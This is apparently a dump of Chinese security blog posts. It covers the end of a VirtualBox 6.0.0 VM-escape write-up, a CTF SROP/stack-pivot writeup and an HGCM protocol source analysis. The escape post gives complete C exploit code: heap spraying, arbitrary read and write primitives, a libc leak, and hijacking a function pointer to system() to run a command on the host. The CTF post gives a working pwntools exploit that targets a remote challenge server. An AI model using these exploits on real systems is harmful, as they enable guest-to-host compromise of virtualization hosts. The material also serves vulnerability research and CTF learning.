/home/sea/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719\n通过栈回溯发现，是因为pHostBuffer在disconnect时，被free了，由于pHostBuffer被我们指向了任意地址，因此不会是一个合法的chunk。但是想到我们并没有对HGCM进行disconnect操作，经过研究发现只要我们的程序结束运行，HGCM就会自动断开。因此解决方法有很多，一种是不让我们的程序结束，结尾放一个死循环；另一种是将disconnect函数指针指向附近的retn指令，使得执行该指令时什么都不做。这里我使用的是第二种方法，因此我们的任意地址读原语\nint arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) &#123;   char val = 0x64;   //防止disconnect时free pHostBuffer时崩溃，我们将disconnect函数指针指向附近的retn指令处   arb_write(client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x1,&amp;val);   //设置pHostBuffer为目的地址   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&amp;addr);   //设置size   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&amp;size);   //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容   stop();   return read_hostbuf(client,0x100,buf);&#125;\ngetshell#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &quot;chromium.h&quot;#include &quot;hgcm.h&quot;#define OFFSET_ALLOC_FUNC_PTR 0xD0#define OFFSET_DISCONN_FUNC_PTR 0x128#define OFFSET_PCLIENT 0x248#define CRVBOXSVCBUFFER_SIZE 0x20#define OFFSET_CONN_HOSTBUF 0x238#define OFFSET_CONN_HOSTBUFSZ 0x244typedef struct LeakClient &#123;   int new_client;   uint64_t client_addr;   uint64_t conn_addr;&#125; LeakClient;typedef struct ArbWrite &#123;   uint32_t size;   uint64_t addr;&#125; ArbWrite;LeakClient leak_client(int client) &#123;   //heap spray   for (int i=0;i&lt;600;i++) &#123;      alloc_buf(client,0x298,&quot;CRConnection_size_fill&quot;,23);   &#125;   for (int i=0;i&lt;600;i++) &#123;      alloc_buf(client,0x9d0,&quot;CRClient_size_fill&quot;,23);   &#125;   //CRClient和CRConnection结构体将被创建   int new_client = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);   for (int i=0;i&lt;600;i++) &#123;      alloc_buf(client,0x298,&quot;CRConnection_size_fill&quot;,23);   &#125;   for (int i=0;i&lt;600;i++) &#123;      alloc_buf(client,0x9d0,&quot;CRClient_size_fill&quot;,23);   &#125;   //释放CRClient和CRConnection结构体   hgcm_disconnect(new_client);   uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type                0x66666666, //conn_id                1, //numOpcodes                CR_EXTEND_OPCODE &lt;&lt; 24,                OFFSET_PCLIENT, //packet_length                CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode                0, //program                *(uint32_t *)&quot;leak&quot; //name                &#125;;   //将crmsg的unpack_buffer申请占位到之前的CRConnection结构体位置，从而进行数据泄露   crmsg(client,0x298,msg,sizeof(msg));   uint64_t client_addr = *(uint64_t *)(crmsg_buf+0x10);   uint64_t conn_addr = client_addr +  0x9e0;   //重新将新的CRClient和CRConnection结构体占位与此   new_client = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);   LeakClient lc = &#123;        .new_client = new_client,        .client_addr = client_addr,        .conn_addr = conn_addr   &#125;;   return lc;&#125;int stop() &#123;   char buf[0x10];   write(1,&quot;stop&quot;,0x5);   read(0,buf,0x10);&#125;int oob_buf;int arb_buf;int make_oob_buf(int client) &#123;   uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type                0x66666666, //conn_id                1, //numOpcodes                CR_EXTEND_OPCODE &lt;&lt; 24,                0x12345678,                CR_SHADERSOURCE_EXTEND_OPCODE, //extend opcode                0, //shader                2, //count                0, //hasNonLocalLen                0x1,0x1B, // *pLocalLength                0x12345678 //padding                &#125;;   //heap spray   int buf1,buf2,buf3,buf4;   for (int i=0;i&lt;0x5000;i++) &#123;       buf1 = alloc_buf(client,sizeof(msg),msg,sizeof(msg));       buf2 = alloc_buf(client,sizeof(msg),&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;,sizeof(msg));       buf3 = alloc_buf(client,sizeof(msg),&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;,sizeof(msg));       buf4 = alloc_buf(client,sizeof(msg),&quot;cccccccccccccccccccccccccccccccccccccc&quot;,sizeof(msg));   &#125;   crmsg_with_bufid(client,buf1);   //generate a new id   char *buf2_id = (char *)&amp;buf2;   for (int i=0;i&lt;4;i++) &#123;      if (buf2_id[i] == &#x27;\\0&#x27;) buf2_id[i] = &#x27;\\n&#x27;;   &#125;   //now buf2 was corrupted   oob_buf = buf2;   arb_buf = buf3;   return 0;&#125;int arb_write(int client,uint64_t addr,uint32_t size,void *buf) &#123;   ArbWrite data = &#123;      .size = size,      .addr = addr   &#125;;   //set CRVBOXSVCBUFFER_t&#x27;s pData and size   write_buf(client,oob_buf,0xa30,0x44,&amp;data,sizeof(data));   //arb write   write_buf(client,arb_buf,size,0,buf,size);   return 0;&#125;int arb_read(int client,uint64_t conn_addr,uint64_t addr,uint32_t size,void *buf) &#123;   char val = 0x64;   //防止disconnect时free pHostBuffer时崩溃，我们将disconnect函数指针指向附近的retn指令处   arb_write(client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x1,&amp;val);   //设置pHostBuffer为目的地址   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUF,0x8,&amp;addr);   //设置size   arb_write(client,conn_addr+OFFSET_CONN_HOSTBUFSZ,0x4,&amp;size);   //通过SHCRGL_GUEST_FN_READ命令读取pHostBuffer指向的内容   stop();   return read_hostbuf(client,0x100,buf);&#125;unsigned char buff[0x100] = &#123;0&#125;;int main() &#123;   int idClient = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);   printf(&quot;idClient=%d\\n&quot;,idClient);   set_version(idClient);   //泄露出CRConnection的地址   LeakClient leak = leak_client(idClient);   int new_client = leak.new_client;   set_version(new_client);   uint64_t conn_addr = leak.conn_addr;   printf(&quot;new_client=%d new_client&#x27;s CRClient addr=0x%lx CRConnection addr=0x%lx\\n&quot;,new_client,leak.client_addr,conn_addr);   //制造OOB对象   make_oob_buf(new_client);   hgcm_disconnect(idClient);   //读取函数指针，泄露地址   arb_read(new_client,conn_addr,conn_addr + OFFSET_ALLOC_FUNC_PTR,8,buff);   uint64_t alloc_addr = *((uint64_t *)buff);   printf(&quot;alloc_addr=0x%lx\\n&quot;,alloc_addr);   uint64_t VBoxOGLhostcrutil_base = alloc_addr - 0x209d0;   uint64_t abort_got = VBoxOGLhostcrutil_base + 0x22F0B0;   arb_read(new_client,conn_addr,abort_got,8,buff);   uint64_t abort_addr = *((uint64_t *)buff);   printf(&quot;abort_addr=0x%lx\\n&quot;,abort_addr);   uint64_t libc_base = abort_addr - 0x407e0;   uint64_t system_addr = libc_base + 0x4f550;   printf(&quot;libc_base=0x%lx\\n&quot;,libc_base);   printf(&quot;system_addr=0x%lx\\n&quot;,system_addr);   //修改disconnect函数指针为system地址   arb_write(new_client,conn_addr+OFFSET_DISCONN_FUNC_PTR,0x8,&amp;system_addr);   char *cmd = &quot;/usr/bin/galculator&quot;;   arb_write(new_client,conn_addr,strlen(cmd)+1,cmd);   //getshell   hgcm_disconnect(new_client);&#125;\n效果如下\n有关我前面分析到的HGCM协议和Chromium协议使用的C语言版的3dpwn库在我的github，欢迎大家来个star。\n0x03 感想第一次完成了VirtualBox的虚拟机逃逸，收获很多，成就感也很大。在安全研究的这条路上还要走很远，加油。\n0x04 参考Breaking Out of VirtualBox through 3D Acceleration48小时逃逸Virtualbox虚拟机——记一次CTF中的0day之旅Virtual-Box-Exploitation-2Better slow than sorry – VirtualBox 3D acceleration considered harmful利用Chromium漏洞夺取CTF胜利：VitualBox虚拟机逃逸漏洞分析（CVE-2019-2446）3dpwn\n","categories":["CTF","安全研究"],"tags":["堆溢出","heap spray","虚拟机逃逸","VirtualBox"]},{"title":"vn_pwn_babybabypwn_1(SROP+栈迁移)","url":"/2020/04/09/vn_pwn_babybabypwn_1/","content":"首先检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n\n\n显然一个signreturn的系统调用，因此可以做SROP。由于开启了PIE，因此，我们不考虑程序的bss段，而是考虑glibc的bss段，因为程序一开始告诉了我们puts函数的地址，我们就可以知道glibc的地址。我们先利用read在glibc的bss段布置下rop，然后栈迁移过去即可。\n#coding:utf8from pwn import *from LibcSearcher import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)#sh = process(&#x27;./vn_pwn_babybabypwn_1&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26187)sh.recvuntil(&#x27;Here is my gift: &#x27;)puts_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)open_addr = libc_base + libc.dump(&#x27;open&#x27;)read_addr = libc_base + libc.dump(&#x27;read&#x27;)bss = libc_base + 0x00000000003C5720pop_rdi = libc_base + 0x0000000000021102pop_rsi = libc_base + 0x00000000000202e8pop_rdx = libc_base + 0x0000000000001b92rop_addr = bss + 0x600#调用read输入rop到libc中的bss里，然后栈迁移到bss里执行ropframe = SigreturnFrame()frame.rdi = 0frame.rsi = rop_addrframe.rdx = 0x200frame.rip = read_addrframe.rsp = rop_addrsh.sendafter(&#x27;Please input magic message:&#x27;,str(frame)[8:])flag_addr = rop_addr + 0x78#open(flag_addr,0)rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)#read(fd,bss,0x30)rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(0x30) + p64(read_addr)#puts(bss)rop += p64(pop_rdi) + p64(bss) + p64(puts_addr)rop += &#x27;/flag\\x00&#x27;sleep(0.5)sh.send(rop)sh.interactive()","categories":["CTF"],"tags":["栈溢出","ROP","SROP"]},{"title":"VirtualBox HGCM协议研究","url":"/2021/04/27/virtualbox-hgcm/","content":"文章首发于安全KER https://www.anquanke.com/post/id/238643\n0x00 前言最近开始研究VirtualBox虚拟机逃逸漏洞，针对于VirtualBox的虚拟机逃逸，我们重点关注它的HGCM（host-guest communication mechanism）协议，本文将结合源码分析和动态调试来分析此协议，最后我们还将实现一个HGCM协议的调用库。\n0x01 VirtualBox 通信协议引言VirtualBox中一个名为HGCM的协议相当于一个RPC，其作用是可以让Guest里的程序通过接口调用Host中的服务程序中的函数。该协议的接口封装在vboxguest驱动程序中。\n在Guest系统中，通过VBoxGuestAdditions.iso安装了一个名为vboxguest的驱动程序，该驱动程序主要就是提供接口给Guset系统里的程序，用于与Host主机进行通信。除了vboxguest驱动，Guset还安装有vboxsf驱动和vboxvideo，其中vboxsf仍然使用的是vboxguest的接口，而vboxvideo则是VirtualBox虚拟出来的显示设备的驱动程序，独立于前面两个驱动。由此可见，Guest与Host之前的通信关键在于vboxguest驱动，因此，我们的研究将从该驱动出发。\n该驱动源码位于src\\VBox\\Additions\\common\\VBoxGuest目录，以Linux系统为例，其源文件为VBoxGuest-linux.c，首先从file_operations结构体可以看到有哪些操作\nstatic struct file_operations   g_FileOpsUser =&#123;    owner:          THIS_MODULE,    open:           vgdrvLinuxOpen,    release:        vgdrvLinuxRelease,#ifdef HAVE_UNLOCKED_IOCTL    unlocked_ioctl: vgdrvLinuxIOCtl,#else    ioctl:          vgdrvLinuxIOCtl,#endif&#125;;\nGUEST IOCTL可以看到定义了vgdrvLinuxIOCtl用于进行接口的访问，跟踪该函数，可以发现其调用了vgdrvLinuxIOCtlSlow函数，\nstatic int vgdrvLinuxIOCtlSlow(struct file *pFilp, unsigned int uCmd, unsigned long ulArg, PVBOXGUESTSESSION pSession)&#123;    int                 rc;    VBGLREQHDR          Hdr;    PVBGLREQHDR         pHdr;    uint32_t            cbBuf;    Log6((&quot;vgdrvLinuxIOCtlSlow: pFilp=%p uCmd=%#x ulArg=%p pid=%d/%d\\n&quot;, pFilp, uCmd, (void *)ulArg, RTProcSelf(), current-&gt;pid));    /*     * Read the header.     */    if (RT_FAILURE(RTR0MemUserCopyFrom(&amp;Hdr, ulArg, sizeof(Hdr))))    &#123;        Log((&quot;vgdrvLinuxIOCtlSlow: copy_from_user(,%#lx,) failed; uCmd=%#x\\n&quot;, ulArg, uCmd));        return -EFAULT;    &#125;    if (RT_UNLIKELY(Hdr.uVersion != VBGLREQHDR_VERSION))    &#123;        Log((&quot;vgdrvLinuxIOCtlSlow: bad header version %#x; uCmd=%#x\\n&quot;, Hdr.uVersion, uCmd));        return -EINVAL;    &#125;    /*     * Buffer the request.     * Note! The header is revalidated by the common code.     */    cbBuf = RT_MAX(Hdr.cbIn, Hdr.cbOut);    if (RT_UNLIKELY(cbBuf &gt; _1M*16))    &#123;        Log((&quot;vgdrvLinuxIOCtlSlow: too big cbBuf=%#x; uCmd=%#x\\n&quot;, cbBuf, uCmd));        return -E2BIG;    &#125;    if (RT_UNLIKELY(   Hdr.cbIn &lt; sizeof(Hdr)                    || (cbBuf != _IOC_SIZE(uCmd) &amp;&amp; _IOC_SIZE(uCmd) != 0)))    &#123;        Log((&quot;vgdrvLinuxIOCtlSlow: bad ioctl cbBuf=%#x _IOC_SIZE=%#x; uCmd=%#x\\n&quot;, cbBuf, _IOC_SIZE(uCmd), uCmd));        return -EINVAL;    &#125;    pHdr = RTMemAlloc(cbBuf);    if (RT_UNLIKELY(!pHdr))    &#123;        LogRel((&quot;vgdrvLinuxIOCtlSlow: failed to allocate buffer of %d bytes for uCmd=%#x\\n&quot;, cbBuf, uCmd));        return -ENOMEM;    &#125;    if (RT_FAILURE(RTR0MemUserCopyFrom(pHdr, ulArg, Hdr.cbIn)))    &#123;        Log((&quot;vgdrvLinuxIOCtlSlow: copy_from_user(,%#lx, %#x) failed; uCmd=%#x\\n&quot;, ulArg, Hdr.cbIn, uCmd));        RTMemFree(pHdr);        return -EFAULT;    &#125;    if (Hdr.cbIn &lt; cbBuf)        RT_BZERO((uint8_t *)pHdr + Hdr.cbIn, cbBuf - Hdr.cbIn);    /*     * Process the IOCtl.     */    rc = VGDrvCommonIoCtl(uCmd, &amp;g_DevExt, pSession, pHdr, cbBuf);\t.........................................................\n可以看到，函数中首先将用户传入的数据转为VBGLREQHDR          Hdr;结构体，该结构体定义如下\ntypedef struct VBGLREQHDR&#123;    /** IN: The request input size, and output size if cbOut is zero.     * @sa VMMDevRequestHeader::size  */    uint32_t        cbIn;    /** IN: Structure version (VBGLREQHDR_VERSION)     * @sa VMMDevRequestHeader::version */    uint32_t        uVersion;    /** IN: The VMMDev request type, set to VBGLREQHDR_TYPE_DEFAULT unless this is a     * kind of VMMDev request.     * @sa VMMDevRequestType, VMMDevRequestHeader::requestType */    uint32_t        uType;    /** OUT: The VBox status code of the operation, out direction only. */    int32_t         rc;    /** IN: The output size.  This is optional - set to zero to use cbIn as the     * output size. */    uint32_t        cbOut;    /** Reserved / filled in by kernel, MBZ.     * @sa VMMDevRequestHeader::fRequestor */    uint32_t        uReserved;&#125; VBGLREQHDR;\n然后判断一些信息是否符合要求，这里，归纳如下\nHdr.uVersion = VBGLREQHDR_VERSIONHdr.cbIn和Hdr.cbOut不能大于_1M*16\n检查通过后，执行rc = VGDrvCommonIoCtl(uCmd, &amp;g_DevExt, pSession, pHdr, cbBuf);，进入VGDrvCommonIoCtl函数，该函数位于VBoxGuest.cpp源文件\nint VGDrvCommonIoCtl(uintptr_t iFunction, PVBOXGUESTDEVEXT pDevExt, PVBOXGUESTSESSION pSession, PVBGLREQHDR pReqHdr, size_t cbReq)&#123;    uintptr_t const iFunctionStripped = VBGL_IOCTL_CODE_STRIPPED(iFunction);    int rc;...............................................................   /*     * Deal with variably sized requests first.     */    rc = VINF_SUCCESS;    if (   iFunctionStripped == VBGL_IOCTL_CODE_STRIPPED(VBGL_IOCTL_VMMDEV_REQUEST(0))        || iFunctionStripped == VBGL_IOCTL_CODE_STRIPPED(VBGL_IOCTL_VMMDEV_REQUEST_BIG) )    &#123;        ........    &#125;    else if (RT_LIKELY(pReqHdr-&gt;uType == VBGLREQHDR_TYPE_DEFAULT))    &#123;        if (iFunctionStripped == VBGL_IOCTL_CODE_STRIPPED(VBGL_IOCTL_LOG(0)))        &#123;            ........        &#125;#ifdef VBOX_WITH_HGCM        else if (iFunction == VBGL_IOCTL_IDC_HGCM_FAST_CALL) /* (is variable size, but we don&#x27;t bother encoding it) */        &#123;            .........        &#125;        else if (   iFunctionStripped == VBGL_IOCTL_CODE_STRIPPED(VBGL_IOCTL_HGCM_CALL(0))# if ARCH_BITS == 64                 || iFunctionStripped == VBGL_IOCTL_CODE_STRIPPED(VBGL_IOCTL_HGCM_CALL_32(0))# endif                )        &#123;            ...........        &#125;        else if (iFunctionStripped == VBGL_IOCTL_CODE_STRIPPED(VBGL_IOCTL_HGCM_CALL_WITH_USER_DATA(0)))        &#123;            ..........        &#125;#endif /* VBOX_WITH_HGCM */        else        &#123;            switch (iFunction)            &#123;\n由于我们想要进入HGCM相关的处理分支里，因此，想要满足pReqHdr-&gt;uType == VBGLREQHDR_TYPE_DEFAULT\n            switch (iFunction)            &#123;............................................#ifdef VBOX_WITH_HGCM                case VBGL_IOCTL_HGCM_CONNECT:                    REQ_CHECK_SIZES(VBGL_IOCTL_HGCM_CONNECT);                    pReqHdr-&gt;rc = vgdrvIoCtl_HGCMConnect(pDevExt, pSession, (PVBGLIOCHGCMCONNECT)pReqHdr);                    break;                case VBGL_IOCTL_HGCM_DISCONNECT:                    REQ_CHECK_SIZES(VBGL_IOCTL_HGCM_DISCONNECT);                    pReqHdr-&gt;rc = vgdrvIoCtl_HGCMDisconnect(pDevExt, pSession, (PVBGLIOCHGCMDISCONNECT)pReqHdr);                    break;#endif\n这里的iFunction值就是我们在ioctl中传入的cmd，当cmd为 VBGL_IOCTL_HGCM_CONNECT或者VBGL_IOCTL_HGCM_DISCONNECT时，可以建立或者断开一个HGCM服务。在一般情况下，使用HGCM调用Host中的服务时，要经过三个步骤VBGL_IOCTL_HGCM_CONNECT-&gt;VBGL_IOCTL_HGCM_CALL-&gt;VBGL_IOCTL_HGCM_DISCONNECT，即打开服务-&gt;调用函数-&gt;关闭服务。可以在src\\VBox\\HostServices目录下看到这些服务以及它们的源码\nsrc\\VBox\\HostServices\tDragAndDrop\tGuestControl\tGuestProperties\tHostChannel\tSharedClipboard\tSharedFolders\tSharedOpenGL\n从这些服务名大致能知道它们的作用，其中SharedClipboard用于在Host和Guest之间共享粘贴板，SharedFolders用于共享文件夹，而SharedOpenGL用于3D图形加速。继续分析HGCM服务的调用\npReqHdr-&gt;rc = vgdrvIoCtl_HGCMConnect(pDevExt, pSession, (PVBGLIOCHGCMCONNECT)pReqHdr);\n可以知道此时将pReqHdr这个VBGLREQHDR结构体指针强制转换为VBGLIOCHGCMCONNECT结构体指针，该结构体定义如下\ntypedef struct VBGLIOCHGCMCONNECT&#123;    /** The header. */    VBGLREQHDR                  Hdr;    union    &#123;        struct        &#123;            HGCMServiceLocation Loc;        &#125; In;        struct        &#123;            uint32_t            idClient;        &#125; Out;    &#125; u;&#125; VBGLIOCHGCMCONNECT, RT_FAR *PVBGLIOCHGCMCONNECT;/** * HGCM service location. * @ingroup grp_vmmdev_req */typedef struct HGCMSERVICELOCATION&#123;    /** Type of the location. */    HGCMServiceLocationType type;    union    &#123;        HGCMServiceLocationHost host;    &#125; u;&#125; HGCMServiceLocation;typedef enum&#123;    VMMDevHGCMLoc_Invalid    = 0,    VMMDevHGCMLoc_LocalHost  = 1,    VMMDevHGCMLoc_LocalHost_Existing = 2,    VMMDevHGCMLoc_SizeHack   = 0x7fffffff&#125; HGCMServiceLocationType;/** * HGCM host service location. * @ingroup grp_vmmdev_req */typedef struct&#123;    char achName[128]; /**&lt; This is really szName. */&#125; HGCMServiceLocationHost;\nVBGL_IOCTL_HGCM_CONNECTVbglR0HGCMInternalConnect进入vgdrvIoCtl_HGCMConnect函数,\nstatic int vgdrvIoCtl_HGCMConnect(PVBOXGUESTDEVEXT pDevExt, PVBOXGUESTSESSION pSession, PVBGLIOCHGCMCONNECT pInfo)&#123;    int rc;    HGCMCLIENTID idClient = 0;    /*     * The VbglHGCMConnect call will invoke the callback if the HGCM     * call is performed in an ASYNC fashion. The function is not able     * to deal with cancelled requests.     */    Log((&quot;VBOXGUEST_IOCTL_HGCM_CONNECT: %.128s\\n&quot;,         pInfo-&gt;u.In.Loc.type == VMMDevHGCMLoc_LocalHost || pInfo-&gt;u.In.Loc.type == VMMDevHGCMLoc_LocalHost_Existing         ? pInfo-&gt;u.In.Loc.u.host.achName : &quot;&lt;not local host&gt;&quot;));    rc = VbglR0HGCMInternalConnect(&amp;pInfo-&gt;u.In.Loc, pSession-&gt;fRequestor, &amp;idClient,                                   vgdrvHgcmAsyncWaitCallback, pDevExt, RT_INDEFINITE_WAIT);    Log((&quot;VBOXGUEST_IOCTL_HGCM_CONNECT: idClient=%RX32 (rc=%Rrc)\\n&quot;, idClient, rc));    if (RT_SUCCESS(rc))    &#123;        /*         * Append the client id to the client id table.         * If the table has somehow become filled up, we&#x27;ll disconnect the session.         */        unsigned i;        RTSpinlockAcquire(pDevExt-&gt;SessionSpinlock);        for (i = 0; i &lt; RT_ELEMENTS(pSession-&gt;aHGCMClientIds); i++)            if (!pSession-&gt;aHGCMClientIds[i])            &#123;                pSession-&gt;aHGCMClientIds[i] = idClient;                break;            &#125;        RTSpinlockRelease(pDevExt-&gt;SessionSpinlock);        if (i &gt;= RT_ELEMENTS(pSession-&gt;aHGCMClientIds))        &#123;            LogRelMax(32, (&quot;VBOXGUEST_IOCTL_HGCM_CONNECT: too many HGCMConnect calls for one session!\\n&quot;));            VbglR0HGCMInternalDisconnect(idClient, pSession-&gt;fRequestor, vgdrvHgcmAsyncWaitCallback, pDevExt, RT_INDEFINITE_WAIT);            pInfo-&gt;u.Out.idClient = 0;            return VERR_TOO_MANY_OPEN_FILES;        &#125;    &#125;    pInfo-&gt;u.Out.idClient = idClient;    return rc;&#125;\n从该函数可以看出，它将调用VbglR0HGCMInternalConnect函数，然后返回一个idClient即客户端号，并将该号码缓存到pSession-&gt;aHGCMClientIds数组中，同时将其返回给Guest中的请求程序。我们继续跟进VbglR0HGCMInternalConnect函数\nDECLR0VBGL(int) VbglR0HGCMInternalConnect(HGCMServiceLocation const *pLoc, uint32_t fRequestor, HGCMCLIENTID *pidClient,                                          PFNVBGLHGCMCALLBACK pfnAsyncCallback, void *pvAsyncData, uint32_t u32AsyncData)&#123;    int rc;    if (   RT_VALID_PTR(pLoc)        &amp;&amp; RT_VALID_PTR(pidClient)        &amp;&amp; RT_VALID_PTR(pfnAsyncCallback))    &#123;        /* Allocate request */        VMMDevHGCMConnect *pHGCMConnect = NULL;        rc = VbglR0GRAlloc((VMMDevRequestHeader **)&amp;pHGCMConnect, sizeof(VMMDevHGCMConnect), VMMDevReq_HGCMConnect);        if (RT_SUCCESS(rc))        &#123;            /* Initialize request memory */            pHGCMConnect-&gt;header.header.fRequestor = fRequestor;            pHGCMConnect-&gt;header.fu32Flags = 0;            memcpy(&amp;pHGCMConnect-&gt;loc, pLoc, sizeof(pHGCMConnect-&gt;loc));            pHGCMConnect-&gt;u32ClientID = 0;            /* Issue request */            rc = VbglR0GRPerform (&amp;pHGCMConnect-&gt;header.header);            if (RT_SUCCESS(rc))            &#123;                /* Check if host decides to process the request asynchronously. */                if (rc == VINF_HGCM_ASYNC_EXECUTE)                &#123;                    /* Wait for request completion interrupt notification from host */                    pfnAsyncCallback(&amp;pHGCMConnect-&gt;header, pvAsyncData, u32AsyncData);                &#125;                rc = pHGCMConnect-&gt;header.result;                if (RT_SUCCESS(rc))                    *pidClient = pHGCMConnect-&gt;u32ClientID;            &#125;            VbglR0GRFree(&amp;pHGCMConnect-&gt;header.header);        &#125;    &#125;    else        rc = VERR_INVALID_PARAMETER;    return rc;&#125;\n该函数主要是新建了一个结构体，并从最开始ioctl操作中传入的结构体中复制HGCMServiceLocation结构体数据，然后传入VbglR0GRPerform函数。VbglR0GRPerform函数实际上就是一个对in和out汇编指令的封装，操作IO接口，可以知道，其请求的端口地址为g_vbgldata.portVMMDev + VMMDEV_PORT_OFF_REQUEST\nVbglR0GRPerformDECLR0VBGL(int) VbglR0GRPerform(VMMDevRequestHeader *pReq)&#123;    int rc = vbglR0Enter();    if (RT_SUCCESS(rc))    &#123;        if (pReq)        &#123;            RTCCPHYS PhysAddr = VbglR0PhysHeapGetPhysAddr(pReq);            if (   PhysAddr != 0                &amp;&amp; PhysAddr &lt; _4G) /* Port IO is 32 bit. */            &#123;                ASMOutU32(g_vbgldata.portVMMDev + VMMDEV_PORT_OFF_REQUEST, (uint32_t)PhysAddr);                /* Make the compiler aware that the host has changed memory. */                ASMCompilerBarrier();                rc = pReq-&gt;rc;            &#125;            else                rc = VERR_VBGL_INVALID_ADDR;        &#125;        else            rc = VERR_INVALID_PARAMETER;    &#125;    return rc;&#125;\n通过查找VMMDEV_PORT_OFF_REQUEST的引用，可以发现src\\VBox\\Devices\\VMMDev\\VMMDev.cpp文件，可以知道这是VirtualBox虚拟出来的IO设备,在vmmdevIOPortRegionMap函数中，通过PDMDevHlpIOPortRegister函数为VMMDEV_PORT_OFF_REQUESTIO端口注册了一个处理函数。\nstatic DECLCALLBACK(int) vmmdevIOPortRegionMap(PPDMDEVINS pDevIns, PPDMPCIDEV pPciDev, uint32_t iRegion,                                               RTGCPHYS GCPhysAddress, RTGCPHYS cb, PCIADDRESSSPACE enmType)&#123;    LogFlow((&quot;vmmdevIOPortRegionMap: iRegion=%d GCPhysAddress=%RGp cb=%RGp enmType=%d\\n&quot;, iRegion, GCPhysAddress, cb, enmType));    RT_NOREF3(iRegion, cb, enmType);    PVMMDEV pThis = RT_FROM_MEMBER(pPciDev, VMMDEV, PciDev);    Assert(enmType == PCI_ADDRESS_SPACE_IO);    Assert(iRegion == 0);    AssertMsg(RT_ALIGN(GCPhysAddress, 8) == GCPhysAddress, (&quot;Expected 8 byte alignment. GCPhysAddress=%#x\\n&quot;, GCPhysAddress));    /*     * Register our port IO handlers.     */    int rc = PDMDevHlpIOPortRegister(pDevIns, (RTIOPORT)GCPhysAddress + VMMDEV_PORT_OFF_REQUEST, 1,                                     pThis, vmmdevRequestHandler, NULL, NULL, NULL, &quot;VMMDev Request Handler&quot;);\n因此我们在Guset中的ASMOutU32(g_vbgldata.portVMMDev + VMMDEV_PORT_OFF_REQUEST, (uint32_t)PhysAddr);请求最终被传入到虚拟设备中的vmmdevRequestHandler函数中进行处理。\nvmmdevRequestHandler/** * @callback_method_impl&#123;FNIOMIOPORTOUT, * Port I/O write andler for the generic request interface.&#125; */static DECLCALLBACK(int) vmmdevRequestHandler(PPDMDEVINS pDevIns, void *pvUser, RTIOPORT Port, uint32_t u32, unsigned cb)&#123;    uint64_t tsArrival;    STAM_GET_TS(tsArrival);    RT_NOREF2(Port, cb);    PVMMDEV pThis = (VMMDevState *)pvUser;    /*     * The caller has passed the guest context physical address of the request     * structure. We&#x27;ll copy all of it into a heap buffer eventually, but we     * will have to start off with the header.     */    VMMDevRequestHeader requestHeader;    RT_ZERO(requestHeader);    PDMDevHlpPhysRead(pDevIns, (RTGCPHYS)u32, &amp;requestHeader, sizeof(requestHeader));.........................................................            if (pRequestHeader)            &#123;                memcpy(pRequestHeader, &amp;requestHeader, sizeof(VMMDevRequestHeader));                /* Try lock the request if it&#x27;s a HGCM call and not crossing a page boundrary.                   Saves on PGM interaction. */                VMMDEVREQLOCK   Lock   = &#123; NULL, &#123; 0, NULL &#125; &#125;;                PVMMDEVREQLOCK  pLock  = NULL;                size_t          cbLeft = requestHeader.size - sizeof(VMMDevRequestHeader);                if (cbLeft)                &#123;                    ...............................                &#125;                /*                 * Feed buffered request thru the dispatcher.                 */                uint32_t fPostOptimize = 0;                PDMCritSectEnter(&amp;pThis-&gt;CritSect, VERR_IGNORED);                rcRet = vmmdevReqDispatcher(pThis, pRequestHeader, u32, tsArrival, &amp;fPostOptimize, &amp;pLock);                PDMCritSectLeave(&amp;pThis-&gt;CritSect);\n请求将被传入vmmdevReqDispatcher函数进行调度\n/** * Dispatch the request to the appropriate handler function. * * @returns Port I/O handler exit code. * @param   pThis           The VMM device instance data. * @param   pReqHdr         The request header (cached in host memory). * @param   GCPhysReqHdr    The guest physical address of the request (for *                          HGCM). * @param   tsArrival       The STAM_GET_TS() value when the request arrived. * @param   pfPostOptimize  HGCM optimizations, VMMDEVREQDISP_POST_F_XXX. * @param   ppLock          Pointer to the lock info pointer (latter can be *                          NULL).  Set to NULL if HGCM takes lock ownership. */static int vmmdevReqDispatcher(PVMMDEV pThis, VMMDevRequestHeader *pReqHdr, RTGCPHYS GCPhysReqHdr,                               uint64_t tsArrival, uint32_t *pfPostOptimize, PVMMDEVREQLOCK *ppLock)&#123;    int rcRet = VINF_SUCCESS;    Assert(*pfPostOptimize == 0);    switch (pReqHdr-&gt;requestType)    &#123;\t...........................................#ifdef VBOX_WITH_HGCM        case VMMDevReq_HGCMConnect:            vmmdevReqHdrSetHgcmAsyncExecute(pThis, GCPhysReqHdr, *ppLock);            pReqHdr-&gt;rc = vmmdevReqHandler_HGCMConnect(pThis, pReqHdr, GCPhysReqHdr);            Assert(pReqHdr-&gt;rc == VINF_HGCM_ASYNC_EXECUTE || RT_FAILURE_NP(pReqHdr-&gt;rc));            if (RT_SUCCESS(pReqHdr-&gt;rc))                *pfPostOptimize |= VMMDEVREQDISP_POST_F_NO_WRITE_OUT;            break;        case 